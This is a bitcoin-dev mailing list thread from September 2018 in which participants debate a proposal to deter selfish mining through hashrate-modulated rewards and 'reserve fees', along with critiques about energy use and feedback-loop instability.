From: bitcoin-dev-bounces at lists.linuxfoundation.org <bitcoin-dev-bounces at lists.linuxfoundation.org> on behalf of Andrew via bitcoin-dev <bitcoin-dev at lists.linuxfoundation.org>
Sent: Friday, 14 September 2018 9:19:37 AM
To: Bitcoin Dev
Subject: Re: [bitcoin-dev] Selfish Mining Prevention

I discussed this more at bitcointalk:
https://bitcointalk.org/index.php?topic=4998410.0

The attacks I'm interested in preventing are not only selfish mining
and collusion, but also more subtle attacks like block withholding,
and in general anything that aims to drive out the competition in
order to increase hashrate fraction. I also scrapped the idea of
changing the block subsidies, and I am only focuses on fees.

You can read more about the motivation and details in the bitcointalk
thread, but my proposal in short would be to add the concept of
"reserve fees". When a user makes a transaction, for each txout
script, they can add parameters that specify the fraction of the total
fee that is held in "reserve" and the time it is held in "reserve"
(can set a limit of 2016 blocks). This "reserve" part of the fee will
be paid to miners if the hashrate rises. So if hashrate is currently h
and peak hashrate (from past year) is p, then for each period (1 day),
a new hashrate is calculated h1, and if h1 > h, then the fraction
(h1-h)/p from the reserve fees created in the past 2016 blocks will be
released to miners for that period (spread out over the 144 blocks in
that period). And this will keep happening as long as hashrate keeps
rising, until the "contract" expires, and the leftover part can be
used by the owner of the unspent output, but it can only be used for
paying fees, not as inputs for future transactions (to save on block
space).

This should incentivize miners to not drive out the competition, since
if they do, there will be less of these reserve fees given to miners.
Yes in the end the miners will get all the fees, but with rising
hashrate they get an unconditional subsidy that does not require
transactions, thus more space for transactions with fees.

I can make a formal BIP and pull request, but I need to know if there
is interest in this. Now fees don't play such a large part of the
block reward, but they will get more important, and this change
wouldn't force anything (would be voluntary by each user), just miners
have to agree to it with a soft fork (so they don't spend from the
anyone-can-spend outputs used for reserve fees). Resource requirements
for validation are quite small I believe.

On Sat, Sep 1, 2018 at 12:11 AM, Andrew <onelineproof at gmail.com> wrote:
> As I understand, selfish mining is an attack where miners collude to
> mine at a lower hashrate then with all miners working independently.
> What are the current strategies used to prevent this and what are the
> future plans?
>
> One idea I have is to let the block reward get "modulated" according
> to peak hashrate. Say p is the peak hashrate for 365 periods (1 year)
> consisting of 144 blocks, h is the hashrate of the last 144 block (1
> day) period, and r is the base subsidy (12.5 BTC currently). You can
> then make the max block reward 0.5 r (1 + h/p). So if hashrate is at
> peak you get the full reward. Otherwise you get less, down to a min of
> 0.5 r.
>
> If miners were to collude to mine at a lower than peak hashrate, then
> they may be able to do it profitably for 144 blocks, but after that,
> the reward would get modulated and it wouldn't be so much in their
> interest to continue mining at the lower hashrate.
>
> What flaws are there with this? I know it could be controversial due
> to easier mining present for early miners, so maybe it would have to
> be done in combination with a new more dynamic difficulty adjustment
> algorithm. But I don't see how hashrate can continue rising
> indefinitely, so a solution should be made for selfish mining.
>
> Also when subsidies stop and a fee market is needed, I guess a portion
> of the fees can be withheld for later if hashrate is not at peak.
>
>
> --
> PGP: B6AC 822C 451D 6304 6A28  49E9 7DB7 011C D53B 5647



--
PGP: B6AC 822C 451D 6304 6A28  49E9 7DB7 011C D53B 5647
_______________________________________________
bitcoin-dev mailing list
bitcoin-dev at lists.linuxfoundation.org
https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180915/f9bfeed9/attachment.html>

From onelineproof at gmail.com  Sat Sep 15 16:01:19 2018
From: onelineproof at gmail.com (Andrew)
Date: Sat, 15 Sep 2018 16:01:19 +0000
Subject: [bitcoin-dev] Selfish Mining Prevention
In-Reply-To: <PS2P216MB017942E0336DD337CB1EB6A89D180@PS2P216MB0179.KORP216.PROD.OUTLOOK.COM>
References: <CAL8tG=k+kXHMbQdUXO3BXKv7fQwp5t2QuaQut7sPUtEYgwzn0A@mail.gmail.com>
	<CAL8tG=mui_izrob0V66QqNzSJs1Lpbm0xxUYMpzb65-JR9QhRw@mail.gmail.com>
	<PS2P216MB017942E0336DD337CB1EB6A89D180@PS2P216MB0179.KORP216.PROD.OUTLOOK.COM>
Message-ID: <CAL8tG==LgUecK5bbZ-FcwSZvJzVuK3nGu6cCUNFMPi4uR0CriA@mail.gmail.com>

@Moral Agent: No problem. I did ask in the first post what the current
plans are for selfish miner prevention. So if anyone has any other
relevant ideas (not just for selfish mining but for making mining more
decentralized and competetive), then please post it, but I just prefer
to focus on my proposal more than others.

@Damian: I think you are concerned that this will incentivize more
global resource consumption and will be detrimental to our
environment? Personally, I believe centralization of energy does more
harm to the environment rather than total energy consumption. If
Bitcoin helps "power" to become more decentralized, then I wouldn't be
surprised if total (global) energy consumption actually decreases. The
debt based economy is forcing us to continuously grow and use up more
resources, and collectivism is turning individuals into
super-organisms capable of doing much more harm to the environment
than can be done by one or a just a few individuals working
independently. In my proposal, I actually allow for changing
environmental conditions by measuring only the peak hashrate of the
past year, and not the full history of blocks.

On Sat, Sep 15, 2018 at 5:29 AM, Damian Williamson <willtech at live.com.au> wrote:
>>This "reserve" part of the fee will be paid to miners if the hashrate
>> rises.
>
>
> Anticipating ongoing hashrate rise shows that you have not yet thought about
> moving outside of the current greed model, a model wherein mining will
> consume all available resources within the colony's objective just to spread
> as far as possible with each new miner bringing diminishing individual
> returns and shortening the life of Earth for no additional gain. Greed model
> := bacteria.
>
> ________________________________
> From: bitcoin-dev-bounces at lists.linuxfoundation.org
> <bitcoin-dev-bounces at lists.linuxfoundation.org> on behalf of Andrew via
> bitcoin-dev <bitcoin-dev at lists.linuxfoundation.org>
> Sent: Friday, 14 September 2018 9:19:37 AM
> To: Bitcoin Dev
> Subject: Re: [bitcoin-dev] Selfish Mining Prevention
>
> I discussed this more at bitcointalk:
> https://bitcointalk.org/index.php?topic=4998410.0
>
> The attacks I'm interested in preventing are not only selfish mining
> and collusion, but also more subtle attacks like block withholding,
> and in general anything that aims to drive out the competition in
> order to increase hashrate fraction. I also scrapped the idea of
> changing the block subsidies, and I am only focuses on fees.
>
> You can read more about the motivation and details in the bitcointalk
> thread, but my proposal in short would be to add the concept of
> "reserve fees". When a user makes a transaction, for each txout
> script, they can add parameters that specify the fraction of the total
> fee that is held in "reserve" and the time it is held in "reserve"
> (can set a limit of 2016 blocks). This "reserve" part of the fee will
> be paid to miners if the hashrate rises. So if hashrate is currently h
> and peak hashrate (from past year) is p, then for each period (1 day),
> a new hashrate is calculated h1, and if h1 > h, then the fraction
> (h1-h)/p from the reserve fees created in the past 2016 blocks will be
> released to miners for that period (spread out over the 144 blocks in
> that period). And this will keep happening as long as hashrate keeps
> rising, until the "contract" expires, and the leftover part can be
> used by the owner of the unspent output, but it can only be used for
> paying fees, not as inputs for future transactions (to save on block
> space).
>
> This should incentivize miners to not drive out the competition, since
> if they do, there will be less of these reserve fees given to miners.
> Yes in the end the miners will get all the fees, but with rising
> hashrate they get an unconditional subsidy that does not require
> transactions, thus more space for transactions with fees.
>
> I can make a formal BIP and pull request, but I need to know if there
> is interest in this. Now fees don't play such a large part of the
> block reward, but they will get more important, and this change
> wouldn't force anything (would be voluntary by each user), just miners
> have to agree to it with a soft fork (so they don't spend from the
> anyone-can-spend outputs used for reserve fees). Resource requirements
> for validation are quite small I believe.
>
> On Sat, Sep 1, 2018 at 12:11 AM, Andrew <onelineproof at gmail.com> wrote:
>> As I understand, selfish mining is an attack where miners collude to
>> mine at a lower hashrate then with all miners working independently.
>> What are the current strategies used to prevent this and what are the
>> future plans?
>>
>> One idea I have is to let the block reward get "modulated" according
>> to peak hashrate. Say p is the peak hashrate for 365 periods (1 year)
>> consisting of 144 blocks, h is the hashrate of the last 144 block (1
>> day) period, and r is the base subsidy (12.5 BTC currently). You can
>> then make the max block reward 0.5 r (1 + h/p). So if hashrate is at
>> peak you get the full reward. Otherwise you get less, down to a min of
>> 0.5 r.
>>
>> If miners were to collude to mine at a lower than peak hashrate, then
>> they may be able to do it profitably for 144 blocks, but after that,
>> the reward would get modulated and it wouldn't be so much in their
>> interest to continue mining at the lower hashrate.
>>
>> What flaws are there with this? I know it could be controversial due
>> to easier mining present for early miners, so maybe it would have to
>> be done in combination with a new more dynamic difficulty adjustment
>> algorithm. But I don't see how hashrate can continue rising
>> indefinitely, so a solution should be made for selfish mining.
>>
>> Also when subsidies stop and a fee market is needed, I guess a portion
>> of the fees can be withheld for later if hashrate is not at peak.
>>
>>
>> --
>> PGP: B6AC 822C 451D 6304 6A28  49E9 7DB7 011C D53B 5647
>
>
>
> --
> PGP: B6AC 822C 451D 6304 6A28  49E9 7DB7 011C D53B 5647
> _______________________________________________
> bitcoin-dev mailing list
> bitcoin-dev at lists.linuxfoundation.org
> https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev



-- 
PGP: B6AC 822C 451D 6304 6A28  49E9 7DB7 011C D53B 5647

From willtech at live.com.au  Sat Sep 15 22:45:55 2018
From: willtech at live.com.au (Damian Williamson)
Date: Sat, 15 Sep 2018 22:45:55 +0000
Subject: [bitcoin-dev] Selfish Mining Prevention
In-Reply-To: <CAL8tG==LgUecK5bbZ-FcwSZvJzVuK3nGu6cCUNFMPi4uR0CriA@mail.gmail.com>
References: <CAL8tG=k+kXHMbQdUXO3BXKv7fQwp5t2QuaQut7sPUtEYgwzn0A@mail.gmail.com>
	<CAL8tG=mui_izrob0V66QqNzSJs1Lpbm0xxUYMpzb65-JR9QhRw@mail.gmail.com>
	<PS2P216MB017942E0336DD337CB1EB6A89D180@PS2P216MB0179.KORP216.PROD.OUTLOOK.COM>,
	<CAL8tG==LgUecK5bbZ-FcwSZvJzVuK3nGu6cCUNFMPi4uR0CriA@mail.gmail.com>
Message-ID: <PS2P216MB0179A4E6401D831166E749089D180@PS2P216MB0179.KORP216.PROD.OUTLOOK.COM>

I see what you say, however, since the proposal as I have read it says "And this will keep happening as long as hashrate keeps rising," - what actually happens in the case hashrate stagnates or falls?


I would prefer to see (not only with your proposal) greater bias toward hashrate being exponentially more uneconomical the more it rises to stifle greed. The current level of mining already greatly exceeds that necessary for the stability of the network and far lower hashrates are completely acceptible provided the network is protected from large switch-ons, which I say is achievable.


I do have other thoughts to approach greed that I have not yet made formal on this list, much unrelated to your proposal, but, I see freedom of use of Bitcoin needing to be censorship resistant but not necessarily mining provided it is protected enough or free or flexible enough to allow for, say, 50k globally distributed standard mining hardware units to exist operating at any one time profitably. That said, I am PoW only and not PoS orientated.

________________________________
From: akaramaoun at gmail.com <akaramaoun at gmail.com> on behalf of Andrew <onelineproof at gmail.com>
Sent: Sunday, 16 September 2018 2:01:19 AM
To: Damian Williamson
Cc: Bitcoin Protocol Discussion
Subject: Re: [bitcoin-dev] Selfish Mining Prevention

@Moral Agent: No problem. I did ask in the first post what the current
plans are for selfish miner prevention. So if anyone has any other
relevant ideas (not just for selfish mining but for making mining more
decentralized and competetive), then please post it, but I just prefer
to focus on my proposal more than others.

@Damian: I think you are concerned that this will incentivize more
global resource consumption and will be detrimental to our
environment? Personally, I believe centralization of energy does more
harm to the environment rather than total energy consumption. If
Bitcoin helps "power" to become more decentralized, then I wouldn't be
surprised if total (global) energy consumption actually decreases. The
debt based economy is forcing us to continuously grow and use up more
resources, and collectivism is turning individuals into
super-organisms capable of doing much more harm to the environment
than can be done by one or a just a few individuals working
independently. In my proposal, I actually allow for changing
environmental conditions by measuring only the peak hashrate of the
past year, and not the full history of blocks.

On Sat, Sep 15, 2018 at 5:29 AM, Damian Williamson <willtech at live.com.au> wrote:
>>This "reserve" part of the fee will be paid to miners if the hashrate
>> rises.
>
>
> Anticipating ongoing hashrate rise shows that you have not yet thought about
> moving outside of the current greed model, a model wherein mining will
> consume all available resources within the colony's objective just to spread
> as far as possible with each new miner bringing diminishing individual
> returns and shortening the life of Earth for no additional gain. Greed model
> := bacteria.
>
> ________________________________
> From: bitcoin-dev-bounces at lists.linuxfoundation.org
> <bitcoin-dev-bounces at lists.linuxfoundation.org> on behalf of Andrew via
> bitcoin-dev <bitcoin-dev at lists.linuxfoundation.org>
> Sent: Friday, 14 September 2018 9:19:37 AM
> To: Bitcoin Dev
> Subject: Re: [bitcoin-dev] Selfish Mining Prevention
>
> I discussed this more at bitcointalk:
> https://bitcointalk.org/index.php?topic=4998410.0
>
> The attacks I'm interested in preventing are not only selfish mining
> and collusion, but also more subtle attacks like block withholding,
> and in general anything that aims to drive out the competition in
> order to increase hashrate fraction. I also scrapped the idea of
> changing the block subsidies, and I am only focuses on fees.
>
> You can read more about the motivation and details in the bitcointalk
> thread, but my proposal in short would be to add the concept of
> "reserve fees". When a user makes a transaction, for each txout
> script, they can add parameters that specify the fraction of the total
> fee that is held in "reserve" and the time it is held in "reserve"
> (can set a limit of 2016 blocks). This "reserve" part of the fee will
> be paid to miners if the hashrate rises. So if hashrate is currently h
> and peak hashrate (from past year) is p, then for each period (1 day),
> a new hashrate is calculated h1, and if h1 > h, then the fraction
> (h1-h)/p from the reserve fees created in the past 2016 blocks will be
> released to miners for that period (spread out over the 144 blocks in
> that period). And this will keep happening as long as hashrate keeps
> rising, until the "contract" expires, and the leftover part can be
> used by the owner of the unspent output, but it can only be used for
> paying fees, not as inputs for future transactions (to save on block
> space).
>
> This should incentivize miners to not drive out the competition, since
> if they do, there will be less of these reserve fees given to miners.
> Yes in the end the miners will get all the fees, but with rising
> hashrate they get an unconditional subsidy that does not require
> transactions, thus more space for transactions with fees.
>
> I can make a formal BIP and pull request, but I need to know if there
> is interest in this. Now fees don't play such a large part of the
> block reward, but they will get more important, and this change
> wouldn't force anything (would be voluntary by each user), just miners
> have to agree to it with a soft fork (so they don't spend from the
> anyone-can-spend outputs used for reserve fees). Resource requirements
> for validation are quite small I believe.
>
> On Sat, Sep 1, 2018 at 12:11 AM, Andrew <onelineproof at gmail.com> wrote:
>> As I understand, selfish mining is an attack where miners collude to
>> mine at a lower hashrate then with all miners working independently.
>> What are the current strategies used to prevent this and what are the
>> future plans?
>>
>> One idea I have is to let the block reward get "modulated" according
>> to peak hashrate. Say p is the peak hashrate for 365 periods (1 year)
>> consisting of 144 blocks, h is the hashrate of the last 144 block (1
>> day) period, and r is the base subsidy (12.5 BTC currently). You can
>> then make the max block reward 0.5 r (1 + h/p). So if hashrate is at
>> peak you get the full reward. Otherwise you get less, down to a min of
>> 0.5 r.
>>
>> If miners were to collude to mine at a lower than peak hashrate, then
>> they may be able to do it profitably for 144 blocks, but after that,
>> the reward would get modulated and it wouldn't be so much in their
>> interest to continue mining at the lower hashrate.
>>
>> What flaws are there with this? I know it could be controversial due
>> to easier mining present for early miners, so maybe it would have to
>> be done in combination with a new more dynamic difficulty adjustment
>> algorithm. But I don't see how hashrate can continue rising
>> indefinitely, so a solution should be made for selfish mining.
>>
>> Also when subsidies stop and a fee market is needed, I guess a portion
>> of the fees can be withheld for later if hashrate is not at peak.
>>
>>
>> --
>> PGP: B6AC 822C 451D 6304 6A28  49E9 7DB7 011C D53B 5647
>
>
>
> --
> PGP: B6AC 822C 451D 6304 6A28  49E9 7DB7 011C D53B 5647
> _______________________________________________
> bitcoin-dev mailing list
> bitcoin-dev at lists.linuxfoundation.org
> https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev



--
PGP: B6AC 822C 451D 6304 6A28  49E9 7DB7 011C D53B 5647
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180915/4a1d493e/attachment.html>

From eric at voskuil.org  Sun Sep 16 23:20:05 2018
From: eric at voskuil.org (Eric Voskuil)
Date: Sun, 16 Sep 2018 16:20:05 -0700
Subject: [bitcoin-dev] Selfish Mining Prevention
In-Reply-To: <PS2P216MB0179A4E6401D831166E749089D180@PS2P216MB0179.KORP216.PROD.OUTLOOK.COM>
References: <CAL8tG=k+kXHMbQdUXO3BXKv7fQwp5t2QuaQut7sPUtEYgwzn0A@mail.gmail.com>
	<CAL8tG=mui_izrob0V66QqNzSJs1Lpbm0xxUYMpzb65-JR9QhRw@mail.gmail.com>
	<PS2P216MB017942E0336DD337CB1EB6A89D180@PS2P216MB0179.KORP216.PROD.OUTLOOK.COM>
	<CAL8tG==LgUecK5bbZ-FcwSZvJzVuK3nGu6cCUNFMPi4uR0CriA@mail.gmail.com>
	<PS2P216MB0179A4E6401D831166E749089D180@PS2P216MB0179.KORP216.PROD.OUTLOOK.COM>
Message-ID: <B1863BA1-59D4-40FD-8D6E-8991BC25BFC8@voskuil.org>

Hash rate cannot get ?more uneconomical?. Mining will always seek a return equal to the cost of capital, as does all production, and the energy expended will always be fundamentally a function of the fee level and energy price. Fee level is determined by variable demand for a fixed supply of confirmation.

When you say greed you are simply referring to economically-rational behavior. It canny be eliminated, nor would that be a benefit.

WRT energy consumption, there is nothing that can be done to reduce it except for people to stop using Bitcoin or for energy to get more expensive.

e

> On Sep 15, 2018, at 15:45, Damian Williamson via bitcoin-dev <bitcoin-dev at lists.linuxfoundation.org> wrote:
> 
> I see what you say, however, since the proposal as I have read it says "And this will keep happening as long as hashrate keeps rising," - what actually happens in the case hashrate stagnates or falls?
> 
> I would prefer to see (not only with your proposal) greater bias toward hashrate being exponentially more uneconomical the more it rises to stifle greed. The current level of mining already greatly exceeds that necessary for the stability of the network and far lower hashrates are completely acceptible provided the network is protected from large switch-ons, which I say is achievable.
> 
> I do have other thoughts to approach greed that I have not yet made formal on this list, much unrelated to your proposal, but, I see freedom of use of Bitcoin needing to be censorship resistant but not necessarily mining provided it is protected enough or free or flexible enough to allow for, say, 50k globally distributed standard mining hardware units to exist operating at any one time profitably. That said, I am PoW only and not PoS orientated.
>  
> From: akaramaoun at gmail.com <akaramaoun at gmail.com> on behalf of Andrew <onelineproof at gmail.com>
> Sent: Sunday, 16 September 2018 2:01:19 AM
> To: Damian Williamson
> Cc: Bitcoin Protocol Discussion
> Subject: Re: [bitcoin-dev] Selfish Mining Prevention
>  
> @Moral Agent: No problem. I did ask in the first post what the current
> plans are for selfish miner prevention. So if anyone has any other
> relevant ideas (not just for selfish mining but for making mining more
> decentralized and competetive), then please post it, but I just prefer
> to focus on my proposal more than others.
> 
> @Damian: I think you are concerned that this will incentivize more
> global resource consumption and will be detrimental to our
> environment? Personally, I believe centralization of energy does more
> harm to the environment rather than total energy consumption. If
> Bitcoin helps "power" to become more decentralized, then I wouldn't be
> surprised if total (global) energy consumption actually decreases. The
> debt based economy is forcing us to continuously grow and use up more
> resources, and collectivism is turning individuals into
> super-organisms capable of doing much more harm to the environment
> than can be done by one or a just a few individuals working
> independently. In my proposal, I actually allow for changing
> environmental conditions by measuring only the peak hashrate of the
> past year, and not the full history of blocks.
> 
> On Sat, Sep 15, 2018 at 5:29 AM, Damian Williamson <willtech at live.com.au> wrote:
> >>This "reserve" part of the fee will be paid to miners if the hashrate
> >> rises.
> >
> >
> > Anticipating ongoing hashrate rise shows that you have not yet thought about
> > moving outside of the current greed model, a model wherein mining will
> > consume all available resources within the colony's objective just to spread
> > as far as possible with each new miner bringing diminishing individual
> > returns and shortening the life of Earth for no additional gain. Greed model
> > := bacteria.
> >
> > ________________________________
> > From: bitcoin-dev-bounces at lists.linuxfoundation.org
> > <bitcoin-dev-bounces at lists.linuxfoundation.org> on behalf of Andrew via
> > bitcoin-dev <bitcoin-dev at lists.linuxfoundation.org>
> > Sent: Friday, 14 September 2018 9:19:37 AM
> > To: Bitcoin Dev
> > Subject: Re: [bitcoin-dev] Selfish Mining Prevention
> >
> > I discussed this more at bitcointalk:
> > https://bitcointalk.org/index.php?topic=4998410.0
> >
> > The attacks I'm interested in preventing are not only selfish mining
> > and collusion, but also more subtle attacks like block withholding,
> > and in general anything that aims to drive out the competition in
> > order to increase hashrate fraction. I also scrapped the idea of
> > changing the block subsidies, and I am only focuses on fees.
> >
> > You can read more about the motivation and details in the bitcointalk
> > thread, but my proposal in short would be to add the concept of
> > "reserve fees". When a user makes a transaction, for each txout
> > script, they can add parameters that specify the fraction of the total
> > fee that is held in "reserve" and the time it is held in "reserve"
> > (can set a limit of 2016 blocks). This "reserve" part of the fee will
> > be paid to miners if the hashrate rises. So if hashrate is currently h
> > and peak hashrate (from past year) is p, then for each period (1 day),
> > a new hashrate is calculated h1, and if h1 > h, then the fraction
> > (h1-h)/p from the reserve fees created in the past 2016 blocks will be
> > released to miners for that period (spread out over the 144 blocks in
> > that period). And this will keep happening as long as hashrate keeps
> > rising, until the "contract" expires, and the leftover part can be
> > used by the owner of the unspent output, but it can only be used for
> > paying fees, not as inputs for future transactions (to save on block
> > space).
> >
> > This should incentivize miners to not drive out the competition, since
> > if they do, there will be less of these reserve fees given to miners.
> > Yes in the end the miners will get all the fees, but with rising
> > hashrate they get an unconditional subsidy that does not require
> > transactions, thus more space for transactions with fees.
> >
> > I can make a formal BIP and pull request, but I need to know if there
> > is interest in this. Now fees don't play such a large part of the
> > block reward, but they will get more important, and this change
> > wouldn't force anything (would be voluntary by each user), just miners
> > have to agree to it with a soft fork (so they don't spend from the
> > anyone-can-spend outputs used for reserve fees). Resource requirements
> > for validation are quite small I believe.
> >
> > On Sat, Sep 1, 2018 at 12:11 AM, Andrew <onelineproof at gmail.com> wrote:
> >> As I understand, selfish mining is an attack where miners collude to
> >> mine at a lower hashrate then with all miners working independently.
> >> What are the current strategies used to prevent this and what are the
> >> future plans?
> >>
> >> One idea I have is to let the block reward get "modulated" according
> >> to peak hashrate. Say p is the peak hashrate for 365 periods (1 year)
> >> consisting of 144 blocks, h is the hashrate of the last 144 block (1
> >> day) period, and r is the base subsidy (12.5 BTC currently). You can
> >> then make the max block reward 0.5 r (1 + h/p). So if hashrate is at
> >> peak you get the full reward. Otherwise you get less, down to a min of
> >> 0.5 r.
> >>
> >> If miners were to collude to mine at a lower than peak hashrate, then
> >> they may be able to do it profitably for 144 blocks, but after that,
> >> the reward would get modulated and it wouldn't be so much in their
> >> interest to continue mining at the lower hashrate.
> >>
> >> What flaws are there with this? I know it could be controversial due
> >> to easier mining present for early miners, so maybe it would have to
> >> be done in combination with a new more dynamic difficulty adjustment
> >> algorithm. But I don't see how hashrate can continue rising
> >> indefinitely, so a solution should be made for selfish mining.
> >>
> >> Also when subsidies stop and a fee market is needed, I guess a portion
> >> of the fees can be withheld for later if hashrate is not at peak.
> >>
> >>
> >> --
> >> PGP: B6AC 822C 451D 6304 6A28  49E9 7DB7 011C D53B 5647
> >
> >
> >
> > --
> > PGP: B6AC 822C 451D 6304 6A28  49E9 7DB7 011C D53B 5647
> > _______________________________________________
> > bitcoin-dev mailing list
> > bitcoin-dev at lists.linuxfoundation.org
> > https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev
> 
> 
> 
> -- 
> PGP: B6AC 822C 451D 6304 6A28  49E9 7DB7 011C D53B 5647
> _______________________________________________
> bitcoin-dev mailing list
> bitcoin-dev at lists.linuxfoundation.org
> https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180916/71c3ed59/attachment-0001.html>

From eric at voskuil.org  Mon Sep 17 15:40:30 2018
From: eric at voskuil.org (Eric Voskuil)
Date: Mon, 17 Sep 2018 08:40:30 -0700
Subject: [bitcoin-dev] Selfish Mining Prevention
In-Reply-To: <CAL8tG=mXXtT-W5zW6H25jNY_H8cr+2JK66ocpjptw+T3W+VwYQ@mail.gmail.com>
References: <CAL8tG=k+kXHMbQdUXO3BXKv7fQwp5t2QuaQut7sPUtEYgwzn0A@mail.gmail.com>
	<CAL8tG=mui_izrob0V66QqNzSJs1Lpbm0xxUYMpzb65-JR9QhRw@mail.gmail.com>
	<PS2P216MB017942E0336DD337CB1EB6A89D180@PS2P216MB0179.KORP216.PROD.OUTLOOK.COM>
	<CAL8tG==LgUecK5bbZ-FcwSZvJzVuK3nGu6cCUNFMPi4uR0CriA@mail.gmail.com>
	<PS2P216MB0179A4E6401D831166E749089D180@PS2P216MB0179.KORP216.PROD.OUTLOOK.COM>
	<B1863BA1-59D4-40FD-8D6E-8991BC25BFC8@voskuil.org>
	<CAL8tG=mXXtT-W5zW6H25jNY_H8cr+2JK66ocpjptw+T3W+VwYQ@mail.gmail.com>
Message-ID: <978F6B0E-C5E4-42FA-B91C-49903A37652B@voskuil.org>

> Also with merge mining and proof of space we can be quite efficient in the future.

Proof of memory (space) is just proof of work with extra steps. It does not reduce energy consumption.

https://github.com/libbitcoin/libbitcoin/wiki/Proof-of-Memory-Facade

Merge mining is non-dedicated cost, so also does not improve energy efficiency. The irreducible *cost* is what matters.

https://github.com/libbitcoin/libbitcoin/wiki/Dedicated-Cost-Principle

e

On Sep 17, 2018, at 06:18, Andrew <onelineproof at gmail.com> wrote:

>> I see what you say, however, since the proposal as I have read it says "And this will keep happening as long as hashrate keeps rising," - what actually happens in the case hashrate stagnates or falls?
> 
> In general, a target hashrate can be set by users (can be less or more
> than the peak hashrate). As long as hashrate is rising and still
> didn't reach the target, miners will incrementally get the reserve
> fees. Once the "contract" times out, the remaining part can be used as
> fees by the users who created the reserve fee "contract". So if
> hashrate remains the same or falls, then users get the reserve fees
> back.
> 
> I agree that we can't stop people from being greedy. If they are not
> Bitcoin mining, they will try to put their energy to earn in some
> other way...The hashrate is related the demand for Bitcoin (price) and
> the amount of fees/subsidies the miners will get paid. For every level
> of mining rewards (based on demand) there exists a limit on the
> hashrate. Once hashrate gets large enough, no new miners (additional
> hashrate) will want to join since their share of the hashrate is too
> small to make a profit.
> 
> Also with merge mining and proof of space we can be quite efficient in
> the future. But of course I sympathize with the "don't be greedy"
> philosophy, and it can be good to educate people to use less resources
> than they need, just I think it's a bit outside of the scope of what
> the Bitcoin software protocol does.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180917/8bcba278/attachment.html>

From eric at voskuil.org  Mon Sep 17 19:36:15 2018
From: eric at voskuil.org (Eric Voskuil)
Date: Mon, 17 Sep 2018 12:36:15 -0700
Subject: [bitcoin-dev] Selfish Mining Prevention
In-Reply-To: <CAL8tG=mXXtT-W5zW6H25jNY_H8cr+2JK66ocpjptw+T3W+VwYQ@mail.gmail.com>
References: <CAL8tG=k+kXHMbQdUXO3BXKv7fQwp5t2QuaQut7sPUtEYgwzn0A@mail.gmail.com>
	<CAL8tG=mui_izrob0V66QqNzSJs1Lpbm0xxUYMpzb65-JR9QhRw@mail.gmail.com>
	<PS2P216MB017942E0336DD337CB1EB6A89D180@PS2P216MB0179.KORP216.PROD.OUTLOOK.COM>
	<CAL8tG==LgUecK5bbZ-FcwSZvJzVuK3nGu6cCUNFMPi4uR0CriA@mail.gmail.com>
	<PS2P216MB0179A4E6401D831166E749089D180@PS2P216MB0179.KORP216.PROD.OUTLOOK.COM>
	<B1863BA1-59D4-40FD-8D6E-8991BC25BFC8@voskuil.org>
	<CAL8tG=mXXtT-W5zW6H25jNY_H8cr+2JK66ocpjptw+T3W+VwYQ@mail.gmail.com>
Message-ID: <49CC1792-9397-4506-B2FC-F3B6C14EA355@voskuil.org>

> Once hashrate gets large enough, no new miners (additional
hashrate) will want to join since their share of the hashrate is too
small to make a profit.

The share (hash power) of a miner is proportional to capital investment, not the newness of that investment. The efficiency of a new mine (inclusive of pooling pressures) can certainly be sufficient to outperform other miners, resulting in the departure of the latter, thus not preventing the entry of the former.

The point you should be making here is that energy consumption is regulated by the cost of capital (in addition to reward value and the cost of energy).

Note that higher efficiency mining does not reduce energy consumption, nor does variation in the necessary cost of mining hardware. The total energy cost is the control, not the hash rate. This is of course why proof-of-memory (space) is pointless. It simply shifts most of the energy cost to hardware manufacture, shipment, etc.

e

On Sep 17, 2018, at 06:18, Andrew <onelineproof at gmail.com> wrote:

>> I see what you say, however, since the proposal as I have read it says "And this will keep happening as long as hashrate keeps rising," - what actually happens in the case hashrate stagnates or falls?
> 
> In general, a target hashrate can be set by users (can be less or more
> than the peak hashrate). As long as hashrate is rising and still
> didn't reach the target, miners will incrementally get the reserve
> fees. Once the "contract" times out, the remaining part can be used as
> fees by the users who created the reserve fee "contract". So if
> hashrate remains the same or falls, then users get the reserve fees
> back.
> 
> I agree that we can't stop people from being greedy. If they are not
> Bitcoin mining, they will try to put their energy to earn in some
> other way...The hashrate is related the demand for Bitcoin (price) and
> the amount of fees/subsidies the miners will get paid. For every level
> of mining rewards (based on demand) there exists a limit on the
> hashrate. Once hashrate gets large enough, no new miners (additional
> hashrate) will want to join since their share of the hashrate is too
> small to make a profit.
> 
> Also with merge mining and proof of space we can be quite efficient in
> the future. But of course I sympathize with the "don't be greedy"
> philosophy, and it can be good to educate people to use less resources
> than they need, just I think it's a bit outside of the scope of what
> the Bitcoin software protocol does.

From wordsgalore at gmail.com  Mon Sep 17 14:09:23 2018
From: wordsgalore at gmail.com (Zawy)
Date: Mon, 17 Sep 2018 10:09:23 -0400
Subject: [bitcoin-dev] Selfish Mining Prevention
Message-ID: <CADtTMvmG8af1+iav6A7y14EPtSgatoGwY5Rpxunm_qLuWMasgw@mail.gmail.com>

The 51% problem is deep. Any discussion of a solution to it should
begin with a link to an article that shows a profound discovery has
been made. Selfish mining prevention and pollution should be on
bitcoin-discussion, but it appears that list is not active.

The problem with Andrew's idea below is that it is a positive feedback
loop that amplifies oscillations. If h goes up or down due to price
changes or random solvetime variation, then the net reward goes in the
same direction, which motivates miners to cause h to go even further
in the same direction, which is a positive feedback loop until some
limit is reached. To make matters worse, miner profit motivation in
choosing which coin to mine is a non-linear function: a 30% drop in
difficulty (or 30% increase in this reward function) in an alt coin
can cause a 300% increase in hashrate.

Average of 144 past blocks to determine h are needed so that it does
not vary too much.  A selfish mine of 72 blocks would result in only a
12.5% loss compared to not using this pro-oscillation function. I've
tried similar reward functions in trying to reduce on-off mining.

There may also be a problem of issuing too many or too few coins,
depending on how fast h rises in the long term.

